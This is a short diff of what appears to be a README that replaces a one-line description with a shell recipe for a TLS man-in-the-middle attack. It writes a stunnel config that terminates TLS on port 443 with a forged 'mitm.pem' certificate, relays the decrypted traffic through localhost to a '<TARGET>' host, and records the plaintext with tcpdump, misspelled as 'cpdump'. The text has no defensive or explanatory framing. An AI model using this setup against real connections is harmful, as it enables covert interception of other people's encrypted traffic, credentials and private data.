@@ -1,2 +1,22 @@
-# man_in_the_middle
-Man man in the middle stunnel setup.
+#create config
+cat <<EOF >> stunnel.conf
+foreground = yes
+debug = info
+output = stunnel.log
+[server]
+client = no
+cert= ./mitm.pem
+accept = source:443
+connect = 127.0.0.1:31337
+
+[client]
+client = yes
+accept = 127.0.0.1:31337
+connect = <TARGET>:443
+EOF
+
+# run stunnel 
+stunnel stunnel.conf
+  
+# capture traffic
+  cpdump -i lo port 31337 -s 0 -w /tmp/mitm.pcap
